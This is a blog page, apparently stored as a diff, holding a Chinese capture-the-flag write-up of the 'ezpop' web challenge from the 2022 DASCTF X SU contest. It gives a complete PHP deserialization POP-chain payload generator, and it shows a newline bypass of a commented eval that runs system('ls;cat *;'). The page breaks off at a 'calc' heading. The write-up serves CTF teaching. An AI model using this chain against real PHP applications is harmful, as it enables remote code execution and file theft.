@@ -1,0 +1,1406 @@
+<!DOCTYPE HTML>
+<html lang="zh_Cn">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="2022DASCTF X SU 三月春季挑战赛web复现, 123">
+    <meta name="description" content="赛题复现">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>2022DASCTF X SU 三月春季挑战赛web复现 | kingkb</title>
+    <link rel="icon" type="image/png" href="/medias/logo1.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.0.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="kingkb" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo1.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">kingkb</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo1.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">kingkb</div>
+        <div class="logo-desc">
+            
+            no game no life
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://kingofkb.github.io/medias/cover/ks2.jpeg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">2022DASCTF X SU 三月春季挑战赛web复现</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="container content">
+
+    
+    <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/pop-upload/">
+                                <span class="chip bg-color">pop upload</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/ctf/" class="post-category">
+                                ctf
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2022-04-05
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-08-29
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    3.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    17 Min
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="2022DASCTF-X-SU-三月春季挑战赛web复现"><a href="#2022DASCTF-X-SU-三月春季挑战赛web复现" class="headerlink" title="2022DASCTF X SU 三月春季挑战赛web复现"></a>2022DASCTF X SU 三月春季挑战赛web复现</h1><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>打开题目，看到源码</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">crow</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$v2</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">v1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">fin</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$f1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span> <span class="token punctuation">.</span> <span class="token string">'114514'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">what</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">mix</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$m1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'#'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>注意到</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">mix</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$m1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'#'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>发现get_Flag函数中有eval，猜测我们要想办法利用get_flag。<br>注意到</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">fin</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$f1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span> <span class="token punctuation">.</span> <span class="token string">'114514'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>fin中的__call会调用get_flag()，我们知道如果你试着调用一个对象中不存在或被权限控制中的方法，__call 方法将会被自动调用。<br>可以知道</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">crow</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$v2</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">v1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>crow中的__incoke方法会调用world()方法，可以尝试用这个来调用fin中的__call方法，当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。<br>最后看</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">what</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>当一个对象被当作字符串对待的时候，会触发__toString这个魔术方法，而其他结构中的run函数都将参数值作为函数调用，可以尝试利用这个来触发__invoke()方法。</p>
+<p>于是构造poke链：fin:__destruct-&gt;what:__toString-&gt;mix:run-&gt;crow:__invoke-&gt;fin:__call-&gt;mix:get_flag</p>
+<p>写payload</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">crow</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$v2</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">v1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">fin</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$f1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span> <span class="token punctuation">.</span> <span class="token string">'114514'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">what</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">mix</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$m1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'#'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$fin1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">fin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$what</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">what</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$mix1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$crow</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">crow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$fin2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">fin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$mix2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$mix2</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
+<span class="token variable">$fin2</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">=</span><span class="token variable">$mix2</span><span class="token punctuation">;</span>
+<span class="token variable">$crow</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">=</span><span class="token variable">$fin2</span><span class="token punctuation">;</span>
+<span class="token variable">$mix1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token operator">=</span><span class="token variable">$crow</span><span class="token punctuation">;</span>
+<span class="token variable">$what</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">=</span><span class="token variable">$mix1</span><span class="token punctuation">;</span>
+<span class="token variable">$fin1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">=</span><span class="token variable">$what</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$fin1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>$mix2-&gt;m1的值即可运行的命令，然后这里 eval 函数里虽然加了注释符，但是可以直接通过换行符做一个绕过。<br>最后构造$mix2-&gt;m1=”\r\nsystem(‘ls;cat *;’);”;</p>
+<p>得到flag：</p>
+<pre class=" language-1"><code class="language-1">flag{79a80052-05bf-47aa-a984-23270a8dbb01}
+</code></pre>
+<p>tips：注意不要用hackbar去post，还是用burpsuite吧，hackbar会出锅。</p>
+<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span>
